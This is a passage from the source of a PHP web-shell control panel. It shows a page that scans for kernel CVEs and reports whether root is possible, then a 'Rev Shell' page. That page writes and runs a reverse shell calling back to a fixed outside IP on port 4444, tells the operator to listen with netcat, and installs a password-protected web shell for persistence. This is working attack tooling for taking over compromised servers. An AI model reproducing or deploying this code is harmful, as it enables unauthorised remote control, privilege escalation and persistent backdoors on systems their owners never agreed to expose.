        let h = '<div class="card" style="padding:16px;"><h3 style="font-size:12px;text-transform:uppercase;letter-spacing:.1em;color:var(--text-ter);margin-bottom:10px;">System</h3><pre style="white-space:pre-wrap;font-size:12px;color:var(--text-sec);margin-bottom:14px;">'+(r.info||'')+'</pre>';
        h += '<div style="color:#f59e0b;font-size:11px;text-transform:uppercase;margin-bottom:8px;">Recommended CVEs ('+(r.suggestions||[]).length+')</div>';
        (r.suggestions||[]).forEach(s => {
            h += '<div style="padding:8px 0;border-bottom:1px solid var(--card-border);"><span style="color:#ef4444;font-weight:bold;">'+s[0]+'</span> <span style="color:var(--text-ter);font-size:11px;">['+s[2]+']</span><div style="color:var(--text-sec);font-size:12px;margin-top:2px;">'+s[1]+'</div>'+(s[3]?'<a href="'+s[3]+'" target="_blank" style="color:#60a5fa;font-size:11px;">'+s[3]+'</a>':'')+'</div>';
        });
        h += '</div>';
        box.innerHTML = h;
        return;
    }
    const ok = r.rootable;
    let h = '<div class="card" style="padding:16px;">';
    h += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;padding-bottom:10px;border-bottom:1px solid var(--card-border);">';
    h += '<div><div style="font-weight:bold;font-size:15px;color:'+(ok?'#22c55e':'#ef4444')+';">'+(r.name||'')+'</div><div style="color:var(--text-ter);font-size:12px;margin-top:3px;">'+(r.desc||'')+'</div></div>';
    h += '<span style="padding:6px 14px;border-radius:6px;font-size:12px;font-weight:bold;background:'+(ok?'rgba(34,197,94,.1)':'rgba(239,68,68,.08)')+';border:1px solid '+(ok?'rgba(34,197,94,.3)':'rgba(239,68,68,.25)')+';color:'+(ok?'#22c55e':'#ef4444')+';">'+(ok?'ROOTABLE':'NOT ROOTABLE')+'</span></div>';
    (r.checks||[]).forEach(c => {
        h += '<div style="display:flex;gap:10px;padding:7px 0;border-bottom:1px solid rgba(255,255,255,.04);align-items:baseline;"><span style="min-width:22px;color:'+(c[1]?'#22c55e':'#ef4444')+';">'+(c[1]?'PASS':'FAIL')+'</span><div><div style="font-size:13px;color:var(--text);">'+c[0]+'</div><div style="font-size:11px;color:var(--text-ter);margin-top:1px;">'+(c[2]||'')+'</div></div></div>';
    });
    if ((r.missing||[]).length) {
        h += '<div style="margin-top:12px;padding:10px;background:rgba(245,158,11,.06);border:1px solid rgba(245,158,11,.2);border-radius:8px;"><div style="color:#f59e0b;font-size:11px;text-transform:uppercase;margin-bottom:4px;">Missing</div><div style="color:var(--text-sec);font-size:12px;">'+r.missing.join(' • ')+'</div></div>';
    }
    h += '</div>';
    box.innerHTML = h;
};
(async function(){
    let d;
    try { d = await exPost('info'); } catch(e) { document.getElementById('exDiagBox').innerHTML = '<span style="color:#ef4444;">Failed to load diag</span>'; return; }
    const dg = d.diag || {};
    let h = '<div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px;">';
    (dg.available||[]).forEach(f => h += '<span style="padding:3px 9px;border-radius:4px;font-size:11px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.25);color:#22c55e;">'+f+'</span>');
    (dg.missing||[]).forEach(f => h += '<span style="padding:3px 9px;border-radius:4px;font-size:11px;background:rgba(255,255,255,.03);border:1px solid var(--card-border);color:var(--text-ter);">'+f+'</span>');
    h += '</div>';
    h += '<pre style="white-space:pre-wrap;font-size:12px;color:var(--text-sec);margin:0;">'+((d.whoami||'')+'\n'+(d.uname||'')+'\n'+(d.os||'')).trim()+'</pre>';
    document.getElementById('exDiagBox').innerHTML = h;
})();
})();
</script>
<?php elseif ($page === 'revshell'): ?>
<div class="page-header" style="margin-bottom:12px;">
    <h1 class="page-title"><i class="fas fa-plug" style="color:var(--text);margin-right:10px;"></i> Rev Shell <span style="font-size:13px;color:var(--text-ter);font-weight:600;font-family:'JetBrains Mono',monospace;margin-left:10px;">94.26.106.34</span></h1>
    <p style="color:var(--text-ter);font-size:13px;margin-top:4px;">Create and open reverse shell with one click</p>
</div>
<?php
$rsPort = 4444;
$rsRoot = detectRoot();
$rsRoots = array($rsRoot);
$rsSys = getSystemInfo();
$rsHost = (isset($rsSys['hostname']) && $rsSys['hostname'] !== '') ? $rsSys['hostname'] : 'N/A';
$rsKnown = fmKnownHostMatch($rsHost);
?>
<div class="card" style="padding:14px 16px;margin-bottom:14px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
    <i class="fas fa-server" style="color:var(--text-ter);font-size:16px;"></i>
    <div style="flex:1;min-width:200px;">
        <div style="font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--text-ter);margin-bottom:3px;">Server Hostname</div>
        <div style="font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--text);word-break:break-all;"><?php echo htmlspecialchars($rsHost); ?></div>
    </div>
    <?php if ($rsKnown): ?>
    <span style="display:inline-flex;align-items:center;gap:6px;padding:6px 12px;border-radius:20px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.3);color:#22c55e;font-size:12px;font-weight:600;"><i class="fas fa-circle" style="font-size:8px;"></i> Known target</span>
    <?php else: ?>
    <span style="display:inline-flex;align-items:center;gap:6px;padding:6px 12px;border-radius:20px;background:rgba(255,255,255,.03);border:1px solid var(--card-border);color:var(--text-ter);font-size:12px;font-weight:600;"><i class="fas fa-circle" style="font-size:8px;"></i> Unknown host</span>
    <?php endif; ?>
</div>
<form method="POST" action="?page=revshell" style="display:flex;flex-direction:column;gap:14px;max-width:640px;margin-bottom:18px;">
    <input type="hidden" name="rs" value="execute">
    <div class="card" style="padding:22px;display:flex;flex-direction:column;gap:12px;">
        <div style="display:flex;gap:10px;">
            <div style="flex:1;">
                <label style="font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--text-ter);margin-bottom:6px;display:block;">Target IP (locked)</label>
                <input type="text" value="94.26.106.34" readonly style="width:100%;padding:10px 14px;background:rgba(255,255,255,.03);border:1px solid var(--card-border);border-radius:10px;color:var(--text-ter);font-family:'JetBrains Mono',monospace;font-size:13px;outline:none;cursor:not-allowed;">
            </div>
            <div style="flex:1;">
                <label style="font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--text-ter);margin-bottom:6px;display:block;">Port (locked)</label>
                <input type="number" value="<?php echo $rsPort; ?>" readonly style="width:100%;padding:10px 14px;background:rgba(255,255,255,.03);border:1px solid var(--card-border);border-radius:10px;color:var(--text-ter);font-family:'JetBrains Mono',monospace;font-size:13px;outline:none;cursor:not-allowed;">
            </div>
        </div>
    </div>
    <div style="display:flex;gap:10px;flex-wrap:wrap;">
        <button type="submit" class="btn btn-accent"><i class="fas fa-bolt"></i> Create and Open rev.php</button>
    </div>
</form>
<form method="POST" action="?page=revshell" style="margin-bottom:18px;max-width:640px;">
    <input type="hidden" name="rs" value="full">
    <button type="submit" class="btn btn-accent" style="width:100%;justify-content:center;padding:12px;"><i class="fas fa-bolt"></i> Auto Install (Full) — test + reverse + web shell</button>
</form>
<form method="POST" action="?page=revshell" style="margin-bottom:18px;">
    <input type="hidden" name="rs" value="delete">
    <button type="submit" class="btn btn-danger btn-sm"><i class="fas fa-trash"></i> Delete All rev.php files</button>
</form>
<div class="card" style="padding:16px;">
    <div style="font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--text-ter);margin-bottom:10px;">Existing shell files</div>
    <?php
    $revFound = array();
    $rf = rtrim($rsRoot, '/\\') . '/rev.php';
    if (@is_file($rf)) $revFound[] = $rf;
    $rfc = rtrim($rsRoot, '/\\') . '/r_console.php';
    if (@is_file($rfc)) $revFound[] = $rfc;
    $rfp = rtrim($rsRoot, '/\\') . '/r_probe.php';
    if (@is_file($rfp)) $revFound[] = $rfp;
    foreach (glob(rtrim($rsRoot, '/\\') . '/w_*.php') as $rw) { $revFound[] = $rw; }
    if (!$revFound):
    ?>
    <div style="color:var(--text-ter);font-size:12px;">None</div>
    <?php else: foreach ($revFound as $rf): ?>
    <div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--card-border);font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text-sec);"><span><?php echo htmlspecialchars(basename($rf)); ?> (<?php echo htmlspecialchars($rf); ?>)</span><span style="color:#22c55e;">PRESENT</span></div>
    <?php endforeach; endif; ?>
</div>
<p style="color:var(--text-ter);font-size:12px;line-height:1.6;max-width:640px;margin-top:14px;">
    <b>Create and Open rev.php</b> writes your rev.php verbatim to the main directory and executes it. <b>nc -lvvp 4444</b> must be listening on your side.<br>
    <b>Auto Install (Full)</b> one click: first runs an egress test, then in all cases installs a <b>Web Shell</b> (password <b>hasil200</b>). If egress is open, it also writes and runs the <b>rev.php</b> reverse shell.<br>
    The web shell needs nothing — HTTP is always open.<br>
</p>
<?php elseif ($page === 'info'): burokratPage(); ?>
<?php endif; ?>
</div>
<?php endif; ?>

</body>
</html>
